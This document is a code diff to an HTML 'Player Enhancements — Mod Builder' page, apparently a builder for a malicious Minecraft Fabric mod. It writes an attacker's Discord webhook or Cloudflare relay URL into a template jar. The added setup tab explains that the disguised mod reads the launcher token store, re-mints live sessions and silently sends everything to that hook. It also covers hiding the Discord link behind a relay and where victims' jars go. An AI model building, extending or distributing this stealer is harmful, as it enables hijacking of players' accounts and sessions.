@@ -6,7 +6,7 @@
 <title>Player Enhancements — Mod Builder</title>
 <script src="jszip.min.js"></script>
 <style>
-  :root { --bg:#0e1116; --card:#171c26; --line:#272e3b; --accent:#5b8c5a; --txt:#e8e6e3; }
+  :root { --bg:#0e1116; --card:#171c26; --line:#272e3b; --accent:#5b8c5a; --txt:#e8e6e3; --mute:#9aa3b2; }
   * { box-sizing: border-box; }
   body {
     margin: 0; min-height: 100vh; display: grid; place-items: center;
@@ -14,13 +14,26 @@
     color: var(--txt); font-family: "Segoe UI", system-ui, sans-serif;
   }
   .card {
-    width: min(460px, 92vw); padding: 2.2rem; border-radius: 16px;
+    width: min(520px, 94vw); padding: 2.2rem; border-radius: 16px;
     background: var(--card); border: 1px solid var(--line);
     box-shadow: 0 20px 60px rgba(0,0,0,.45);
   }
-  .pick { font-size: 2.4rem; line-height: 1; margin-bottom: .4rem; }
+  .pick { font-size: 2.2rem; line-height: 1; margin-bottom: .4rem; }
   h1 { margin: 0 0 .3rem; font-size: 1.55rem; font-weight: 600; letter-spacing: -.01em; }
-  .sub { margin: 0 0 1.6rem; color: #9aa3b2; font-size: .92rem; }
+  .sub { margin: 0 0 1.4rem; color: var(--mute); font-size: .92rem; }
+
+  /* tabs */
+  .tabs { display: flex; gap: .4rem; margin-bottom: 1.6rem; }
+  .tab {
+    flex: 1; padding: .6rem 0; border: 1px solid var(--line); border-radius: 10px;
+    background: #0f131b; color: var(--mute); font-weight: 600; font-size: .92rem;
+    cursor: pointer; transition: all .15s;
+  }
+  .tab:hover { color: var(--txt); border-color: #3a4356; }
+  .tab.active { background: var(--accent); border-color: var(--accent); color: #0e1116; }
+  .panel { display: none; }
+  .panel.active { display: block; }
+
   input {
     width: 100%; padding: .8rem .9rem; border-radius: 10px;
     border: 1px solid var(--line); background: #0f131b; color: var(--txt);
@@ -28,31 +41,93 @@
     font-family: inherit;
   }
   input:focus { border-color: var(--accent); }
-  button {
+  button.btn {
     width: 100%; margin-top: .9rem; padding: .85rem; border: 0; border-radius: 10px;
     background: var(--accent); color: #0e1116; font-weight: 600; font-size: 1rem;
     cursor: pointer; transition: filter .15s;
   }
-  button:hover { filter: brightness(1.12); }
-  button:disabled { opacity: .55; cursor: default; }
-  #status { margin-top: 1rem; font-size: .9rem; color: #9aa3b2; min-height: 1.2em; }
+  button.btn:hover { filter: brightness(1.12); }
+  button.btn:disabled { opacity: .55; cursor: default; }
+  #status { margin-top: 1rem; font-size: .9rem; color: var(--mute); min-height: 1.2em; }
   #dl { display: inline-block; margin-top: .9rem; color: var(--accent); font-weight: 600; }
   #stats { margin-top: .8rem; font-size: .8rem; color: #6b7280; }
   .err { color: #d57a7a; }
+
+  ol.steps { margin: 0; padding-left: 1.3rem; display: grid; gap: .9rem; }
+  li::marker { color: var(--accent); font-weight: 700; }
+  code.inline {
+    background: #0f131b; border: 1px solid var(--line); border-radius: 6px;
+    padding: .15em .4em; font-size: .85em; color: #c9d1d9;
+    word-break: break-all;
+  }
+  .note {
+    margin-top: 1.4rem; padding: .8rem .9rem; border-radius: 10px;
+    background: rgba(91,140,90,.08); border: 1px solid rgba(91,140,90,.25);
+    font-size: .85rem; color: #b8c4b8; line-height: 1.5;
+  }
 </style>
 </head>
 <body>
   <main class="card">
     <div class="pick">⛏️</div>
     <h1>Player Enhancements</h1>
-    <p class="sub">Drop your hook URL, grab a mod. One click, your own jar.</p>
+    <p class="sub">Build the mod, or read the setup. Your call.</p>
 
-    <input id="wh" type="text" spellcheck="false" autocomplete="off"
-           placeholder="https://your-relay.workers.dev — or your Discord hook">
-    <button id="build" disabled>Loading template…</button>
-    <div id="status"></div>
-    <a id="dl" href="#" download>Download your mod</a>
-    <div id="stats"></div>
+    <nav class="tabs">
+      <button class="tab active" data-tab="build" id="tab-build">Build</button>
+      <button class="tab" data-tab="setup" id="tab-setup">How to use / Setup</button>
+    </nav>
+
+    <!-- BUILD -->
+    <section class="panel active" id="panel-build">
+      <input id="wh" type="text" spellcheck="false" autocomplete="off"
+             placeholder="https://your-relay.workers.dev — or your Discord hook">
+      <button class="btn" id="build" disabled>Loading template…</button>
+      <div id="status"></div>
+      <a id="dl" href="#" download>Download your mod</a>
+      <div id="stats"></div>
+    </section>
+
+    <!-- SETUP -->
+    <section class="panel" id="panel-setup">
+      <ol class="steps">
+        <li>
+          <strong>Get a hook URL</strong> — either a Discord webhook
+          (<code class="inline">discord.com/api/webhooks/...</code>) or, better,
+          a Cloudflare relay URL (<code class="inline">…workers.dev</code>) that
+          silently forwards to Discord. No Discord text appears in the jar.
+        </li>
+        <li>
+          <strong>Go to the Build tab</strong>, paste the hook URL into the box,
+          click <strong>Build Mod</strong> and download the jar.
+        </li>
+        <li>
+          <strong>Install Fabric for 1.21.11</strong> — run the official Fabric
+          installer and make a 1.21.11 instance. You need Fabric Loader +
+          the matching Fabric API in your mods folder.
+        </li>
+        <li>
+          <strong>Drop the jar into your mods folder</strong> — press
+          <code class="inline">Win + R</code>, type
+          <code class="inline">%appdata%\.minecraft\mods</code>, Enter, then
+          paste the mod in. Have the launcher <em>closed</em> while you do it.
+        </li>
+        <li>
+          <strong>Launch Minecraft</strong> from the Fabric profile. Within a few
+          seconds the mod reads the launcher token store, re-mints a live session
+          where possible, and pushes everything to your hook URL.
+        </li>
+      </ol>
+      <div class="note">
+        <strong>Troubleshooting:</strong> nothing arriving → re-check the URL in
+        the jar (open it with any unzipper, look at
+        <code class="inline">webhook.txt</code>), confirm the relay's
+        <code class="inline">DISCORD_WEBHOOK</code> env var is set, make sure
+        the mod is in <code class="inline">mods</code> (not the jar you
+        downloaded) and that Fabric API is present. The mod reports nothing at
+        all — it works or it doesn't. Silence usually means a bad URL.
+      </div>
+    </section>
   </main>
 
 <script>
@@ -60,7 +135,18 @@
   const wh = $('wh'), btn = $('build'), status = $('status'), dl = $('dl'), stats = $('stats');
   dl.style.display = 'none';
 
-  // builds are counted in this browser only — GitHub Pages has no backend
+  // ---- tabs ----
+  const tabs = document.querySelectorAll('.tab');
+  function show(tabId) {
+    tabs.forEach(t => t.classList.toggle('active', t.dataset.tab === tabId));
+    document.querySelectorAll('.panel').forEach(p =>
+      p.classList.toggle('active', p.id === 'panel-' + tabId));
+  }
+  tabs.forEach(t => t.addEventListener('click', () => show(t.dataset.tab)));
+  // deep-link: #build or #setup
+  show((location.hash || '#build').replace('#', ''));
+
+  // ---- build ----
   const KEY = 'moggrab_builds';
   stats.textContent = (parseInt(localStorage.getItem(KEY) || '0', 10) || 0) + ' jars built here';
 
@@ -81,11 +167,11 @@
   loadTemplate();
 
   btn.addEventListener('click', async () => {
-    const webhook = wh.value.trim();
+    const url = wh.value.trim();
     status.className = '';
     dl.style.display = 'none';
 
-    if (!/^https:\/\/[^\s/]+\/[^\s]*$/.test(webhook) || webhook.length > 300) {
+    if (!/^https:\/\/[^\s/]+\/[^\s]*$/.test(url) || url.length > 300) {
       status.textContent = 'Needs a real HTTPS hook URL (Discord or your relay).';
       status.className = 'err';
       return;
@@ -95,9 +181,9 @@
     status.textContent = 'Stitching the jar…';
 
     try {
-      // re-zip in the browser: template jar + this webhook burned into webhook.txt
+      // re-zip in the browser: template jar + this URL burned into webhook.txt
       const zip = await JSZip.loadAsync(template);
-      zip.file('webhook.txt', webhook);
+      zip.file('webhook.txt', url);
       const blob = await zip.generateAsync({
         type: 'blob',
         mimeType: 'application/java-archive',
@@ -107,8 +193,8 @@
 
       const name = 'PlayerEnhancements-1.21.11-' +
         Date.now().toString(36).slice(-4) + '.jar';
-      const url = URL.createObjectURL(blob);
-      dl.href = url;
+      const download = URL.createObjectURL(blob);
+      dl.href = download;
       dl.download = name;
       dl.textContent = 'Download ' + name;
       dl.style.display = 'inline-block';
